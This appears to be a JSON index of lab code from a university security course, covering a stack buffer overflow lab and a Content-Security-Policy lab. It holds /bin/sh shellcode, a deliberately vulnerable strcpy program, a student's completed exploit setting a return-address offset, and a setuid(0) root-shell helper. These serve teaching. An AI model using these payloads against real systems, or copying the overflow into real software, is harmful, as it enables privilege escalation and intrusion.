@@ -1,0 +1,91 @@
+[
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 1\\code files",
+    "code_files": [
+      "programming assg\\lab 1\\code files\\call_shellcode.c",
+      "programming assg\\lab 1\\code files\\exploit.c",
+      "programming assg\\lab 1\\code files\\exploit.py",
+      "programming assg\\lab 1\\code files\\stack.c"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\call_shellcode.c",
+        "snippet": "/* call_shellcode.c  */\n\n/*A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n\nconst char code[] =\n  \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n  \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n  \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x53\"                 /* pushl   %ebx                   */\n  \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n  \"\\x99\"                 /* cdq                            */\n  \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n  \"\\xcd\\x80\"             /* int     $0x80                  */\n;\n\nint main(int argc, char **argv)\n{\n   char buf[sizeof(code)];\n   strcpy(buf, code);\n   ((void(*)( ))buf)( );\n}"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\exploit.c",
+        "snippet": "/* exploit.c  */\n\n/* A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nchar shellcode[]=\n    \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n    \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x53\"                 /* pushl   %ebx                   */\n    \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n    \"\\x99\"                 /* cdq                            */\n    \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n    \"\\xcd\\x80\"             /* int     $0x80                  */\n;\n\nvoid main(int argc, char **argv)\n{\n    char buffer[517];\n    FILE *badfile;\n\n    /* Initialize buffer with 0x90 (NOP instruction) */\n    memset(&buffer, 0x90, 517);\n\n    /* You need to fill the buffer with appropriate contents here */ \n\n    /* Save the contents to the file \"badfile\" */\n    badfile = fopen(\"./badfile\", \"w\");\n    fwrite(buffer, 517, 1, badfile);\n    fclose(badfile);\n}"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\exploit.py",
+        "snippet": "#!/usr/bin/python3\nimport sys\n\nshellcode= (\n   \"\\x31\\xc0\"    # xorl    %eax,%eax\n   \"\\x50\"        # pushl   %eax\n   \"\\x68\"\"//sh\"  # pushl   $0x68732f2f\n   \"\\x68\"\"/bin\"  # pushl   $0x6e69622f\n   \"\\x89\\xe3\"    # movl    %esp,%ebx\n   \"\\x50\"        # pushl   %eax\n   \"\\x53\"        # pushl   %ebx\n   \"\\x89\\xe1\"    # movl    %esp,%ecx\n   \"\\x99\"        # cdq\n   \"\\xb0\\x0b\"    # movb    $0x0b,%al\n   \"\\xcd\\x80\"    # int     $0x80\n).encode('latin-1')\n\n\n# Fill the content with NOP's\ncontent = bytearray(0x90 for i in range(517)) \n\n# Put the shellcode at the end\nstart = 517 - len(shellcode) \ncontent[start:] = shellcode\n\n##################################################################\nret    = 0xAABBCcDD   # replace 0xAABBCCDD with the correct value\noffset = 0            # replace 0 with the correct value\n\ncontent[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') \n##################################################################\n\n# Write the content to a file\nwith open('badfile', 'wb') as f:\n  f.write(content)"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\stack.c",
+        "snippet": "/* Vunlerable program: stack.c */\n/* You can get this program from the lab's website */\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 0 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 24\n#endif\n\nint bof(char *str)\n{\n    char buffer[BUF_SIZE];\n\n    /* The following statement has a buffer overflow problem */\n    strcpy(buffer, str);       \n\n    return 1;\n}\n\nint main(int argc, char **argv)\n{\n    char str[517];\n    FILE *badfile;\n\n     /* Change the size of the dummy array to randomize the parameters\n       for this lab. Need to use the array at least once */\n    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);\n\n    badfile = fopen(\"badfile\", \"r\");\n    fread(str, sizeof(char), 517, badfile);\n    bof(str);\n    printf(\"Returned Properly\\n\");\n    return 1;\n}"
+      }
+    ]
+  },
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 1\\lab1_meech_complete",
+    "code_files": [
+      "programming assg\\lab 1\\lab1_meech_complete\\call_shellcode.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\exploit.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\exploit.py",
+      "programming assg\\lab 1\\lab1_meech_complete\\root_access.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\stack.c"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\call_shellcode.c",
+        "snippet": "/* call_shellcode.c  */\n\n/*A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nconst char code[] =\n  \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n  \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n  \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x53\"                 /* pushl   %ebx                   */\n  \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n  \"\\x99\"                 /* cdq                            */\n  \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n  \"\\xcd\\x80\"             /* int     $0x80                  */\n;\n\nint main(int argc, char **argv)\n{\n   char buf[sizeof(code)];\n   strcpy(buf, code);\n   ((void(*)( ))buf)( );\n}"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\exploit.c",
+        "snippet": "/* exploit.c  */\n//modified by Demetrius Johnson  on 10/3/22 for CIS-447 UM-Dearborn with Dr. Anys Bacha\n\n/* A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nchar shellcode[]=\n    \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n    \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x53\"                 /* pushl   %ebx                   */\n    \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n    \"\\x99\"                 /* cdq                            */\n    \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n    \"\\xcd\\x80\"             /* int     $0x80                  */\n;\n\nvoid main(int argc, char **argv)\n{\n    char buffer[517];\n    FILE *badfile;\n\n    /* Initialize buffer with 0x90 (NOP instruction) */\n    memset(&buffer, 0x90, 517);\n    \n    /* You need to fill the buffer with appropriate contents here */ \n\t//insert shell code into the latter half of buffer up to last byte:\n    int shell_code_iterator = 0;\n    for(int i = sizeof(buffer) - sizeof(shellcode); i < sizeof(buffer); i++)\n\tbuffer[i] = shellcode[shell_code_iterator++];\n    int addr_val_offset = 140; //set offset value\n    int ret_addr_value = 0xbfffe9e8 + addr_val_offset; //set what address to return to \n    int ebp_offset = 72;\n    int ret_addr_offset = ebp_offset + 4; //this is the offset from buffer in stack.c bof() function\n    int* ptr = (int*)(buffer + ret_addr_offset);//need to cast buffer address as int\n// so we can point to that location in the buffer char array."
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\exploit.py",
+        "snippet": "#!/usr/bin/python3\nimport sys\n\nshellcode= (\n   \"\\x31\\xc0\"    # xorl    %eax,%eax\n   \"\\x50\"        # pushl   %eax\n   \"\\x68\"\"//sh\"  # pushl   $0x68732f2f\n   \"\\x68\"\"/bin\"  # pushl   $0x6e69622f\n   \"\\x89\\xe3\"    # movl    %esp,%ebx\n   \"\\x50\"        # pushl   %eax\n   \"\\x53\"        # pushl   %ebx\n   \"\\x89\\xe1\"    # movl    %esp,%ecx\n   \"\\x99\"        # cdq\n   \"\\xb0\\x0b\"    # movb    $0x0b,%al\n   \"\\xcd\\x80\"    # int     $0x80\n).encode('latin-1')\n\n\n# Fill the content with NOP's\ncontent = bytearray(0x90 for i in range(517)) \n\n# Put the shellcode at the end\nstart = 517 - len(shellcode) \ncontent[start:] = shellcode\n\n##################################################################\nret    = 0xAABBCcDD   # replace 0xAABBCCDD with the correct value\noffset = 0            # replace 0 with the correct value\n\ncontent[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') \n##################################################################\n\n# Write the content to a file\nwith open('badfile', 'wb') as f:\n  f.write(content)"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\root_access.c",
+        "snippet": "void main()\n{\n\nsetuid(0);\nsystem (\"/bin/sh\");\n\n\n}"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\stack.c",
+        "snippet": "/* Vunlerable program: stack.c */\n/* You can get this program from the lab's website */\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 0 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 64\n#endif\n\nint bof(char *str)\n{\n    char buffer[BUF_SIZE];\n\n    /* The following statement has a buffer overflow problem */\n    strcpy(buffer, str);       \n\n    return 1;\n}\n\nint main(int argc, char **argv)\n{\n    char str[517];\n    FILE *badfile;\n\n     /* Change the size of the dummy array to randomize the parameters\n       for this lab. Need to use the array at least once */\n    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);\n\n    badfile = fopen(\"badfile\", \"r\");\n    fread(str, sizeof(char), 517, badfile);\n    bof(str);\n    printf(\"Returned Properly\\n\");\n    return 1;\n}"
+      }
+    ]
+  },
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 3 - final exam\\csp\\csp",
+    "code_files": [
+      "programming assg\\lab 3 - final exam\\csp\\csp\\http_server.py",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script1.js",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script2.js",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script3.js"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\http_server.py",
+        "snippet": "#!/usr/bin/env python3\n\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom urllib.parse import *\n\nclass MyHTTPRequestHandler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    o = urlparse(self.path)\n    f = open(\".\" + o.path, 'rb') \n    self.send_response(200)\n    self.send_header('Content-Security-Policy', \n          \"default-src 'self';\"\n          \"script-src 'self' *.example68.com:8000 'nonce-1rA2345' \")     \n    self.send_header('Content-type', 'text/html')\n    self.end_headers()\n    self.wfile.write(f.read())\n    f.close()\n\nhttpd = HTTPServer(('127.0.0.1', 8000), MyHTTPRequestHandler)\nhttpd.serve_forever()"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script1.js",
+        "snippet": "document.getElementById('area4').innerHTML = \"OK\";"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script2.js",
+        "snippet": "document.getElementById('area5').innerHTML = \"OK\";"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script3.js",
+        "snippet": "document.getElementById('area6').innerHTML = \"OK\";"
+      }
+    ]
+  }
+]
